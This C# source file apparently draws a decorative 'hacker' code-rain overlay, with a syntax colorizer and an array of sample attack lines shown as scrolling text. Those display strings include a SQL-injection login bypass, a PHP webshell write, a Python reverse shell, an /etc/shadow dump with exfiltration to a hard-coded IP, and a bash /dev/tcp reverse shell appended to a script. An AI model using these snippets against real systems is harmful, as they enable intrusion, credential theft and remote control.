using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Windows.Documents;
using System.Windows.Media;

namespace HackerOverlay
{
    /// <summary>
    /// Fake-but-plausible source code lines plus a lightweight syntax colorizer,
    /// used to render a "streaming code" rain effect instead of matrix glyphs.
    /// </summary>
    internal static class CodeRain
    {
        private static readonly string[] Lines =
        {
            "import socket, struct, sys, os",
            "import paramiko, requests, subprocess",
            "",
            "# stage 1 — recon",
            "def scan_ports(ip, ports):",
            "    open_ports = []",
            "    for port in ports:",
            "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
            "        s.settimeout(0.4)",
            "        if s.connect_ex((ip, port)) == 0:",
            "            open_ports.append(port)",
            "        s.close()",
            "    return open_ports",
            "",
            "# stage 2 — exploit the SQLi login",
            "payload = \"' OR '1'='1' -- \"",
            "r = requests.post(url, data={'username': payload, 'password': 'x'})",
            "if 'Welcome' in r.text:",
            "    print('[+] auth bypass successful')",
            "",
            "# stage 3 — drop a webshell via INTO OUTFILE",
            "sql = \"' UNION SELECT '<?php system($_GET[0]);?>',2 INTO OUTFILE '/var/www/html/x.php'-- \"",
            "cursor.execute(sql)",
            "",
            "class ReverseShell:",
            "    def __init__(self, host, port):",
            "        self.host = host",
            "        self.port = port",
            "",
            "    def connect(self):",
            "        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
            "        self.sock.connect((self.host, self.port))",
            "        os.dup2(self.sock.fileno(), 0)",
            "        os.dup2(self.sock.fileno(), 1)",
            "        os.dup2(self.sock.fileno(), 2)",
            "        subprocess.call(['/bin/sh', '-i'])",
            "",
            "ssh_key = paramiko.RSAKey.from_private_key_file('id_rsa')",
            "client = paramiko.SSHClient()",
            "client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
            "client.connect(target_ip, username='devops', pkey=ssh_key)",
            "stdin, stdout, stderr = client.exec_command('whoami')",
            "print(stdout.read().decode())",
            "",
            "# privesc — suid python3",
            "os.system(\"python3 -c 'import os; os.setuid(0)'\")",
            "",
            "# dumping /etc/shadow",
            "with open('/etc/shadow', 'r') as f:",
            "    hashes = f.readlines()",
            "for h in hashes:",
            "    exfil_queue.append(h.strip())",
            "",
            "def exfiltrate(data, c2_host='185.220.101.47', c2_port=4444):",
            "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
            "    s.connect((c2_host, c2_port))",
            "    s.sendall(data.encode())",
            "    s.close()",
            "",
            "struct.pack('<I', 0x41414141)  # overwrite return address",
            "buf = b'A' * 112 + struct.pack('<Q', ret_addr) + shellcode",
            "",
            "// C2 beacon loop",
            "while (1) {",
            "    beacon(c2_url);",
            "    sleep(30);",
            "}",
            "",
            "SELECT username, password FROM users WHERE role='admin';",
            "UPDATE accounts SET balance = balance + 999999 WHERE id = 1;",
            "",
            "$ nmap -sS -p- -T4 10.5.5.0/24",
            "$ hydra -l admin -P rockyou.txt ssh://10.5.5.165",
            "$ sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "",
            "chmod 777 /opt/scripts/cleanup.sh",
            "echo 'bash -i >& /dev/tcp/10.5.5.1/4444 0>&1' >> cleanup.sh",
        };

        private static readonly Regex CommentRx = new(@"^(\s*)(#.*|//.*)$");
        private static readonly Regex StringRx  = new("(\"[^\"]*\"|'[^']*')");
        private static readonly Regex NumberRx  = new(@"\b(0x[0-9a-fA-F]+|\d+)\b");

        private static readonly string[] Keywords =
        {
            "def","class","import","from","if","else","elif","for","while","return",
            "with","as","try","except","print","self","int","void","char",
            "const","let","function","echo","SELECT","UPDATE","WHERE","FROM","SET",
            "struct","os","subprocess","socket","sudo","chmod"
        };

        private static readonly Brush KeywordBrush = new SolidColorBrush(Color.FromRgb(0x4F, 0xC3, 0xF7));
        private static readonly Brush StringBrush  = new SolidColorBrush(Color.FromRgb(0xFF, 0xD5, 0x4F));
        private static readonly Brush NumberBrush  = new SolidColorBrush(Color.FromRgb(0xB3, 0x88, 0xFF));
        private static readonly Brush CommentBrush = new SolidColorBrush(Color.FromRgb(0x5C, 0x8A, 0x5C));
        private static readonly Brush DefaultBrush = new SolidColorBrush(Color.FromRgb(0xAE, 0xEA, 0x9A));

        private static readonly Random Rng = new();

        public static string RandomLine() => Lines[Rng.Next(Lines.Length)];

        /// <summary>
        /// Returns one brush per character in the line, matching the same
        /// keyword/string/number/comment rules as the old whole-line colorizer.
        /// Used by the typewriter effect to color each character as it's typed.
        /// </summary>
        public static Brush[] GetCharBrushes(string line)
        {
            var brushes = new Brush[line.Length];
            if (line.Length == 0) return brushes;

            if (CommentRx.IsMatch(line))
            {
                for (int i = 0; i < line.Length; i++) brushes[i] = CommentBrush;
                return brushes;
            }

            for (int i = 0; i < line.Length; i++) brushes[i] = DefaultBrush;

            var tokens = new List<(int start, int len, Brush brush)>();

            foreach (Match m in StringRx.Matches(line))
                tokens.Add((m.Index, m.Length, StringBrush));

            foreach (Match m in NumberRx.Matches(line))
            {
                if (Overlaps(tokens, m.Index)) continue;
                tokens.Add((m.Index, m.Length, NumberBrush));
            }

            foreach (var kw in Keywords)
            {
                foreach (Match m in Regex.Matches(line, $@"\b{Regex.Escape(kw)}\b"))
                {
                    if (Overlaps(tokens, m.Index)) continue;
                    tokens.Add((m.Index, m.Length, KeywordBrush));
                }
            }

            foreach (var (start, len, brush) in tokens)
                for (int i = start; i < start + len && i < line.Length; i++)
                    brushes[i] = brush;

            return brushes;
        }

        private static bool Overlaps(List<(int start, int len, Brush brush)> tokens, int index)
            => tokens.Exists(t => index >= t.start && index < t.start + t.len);
    }
}
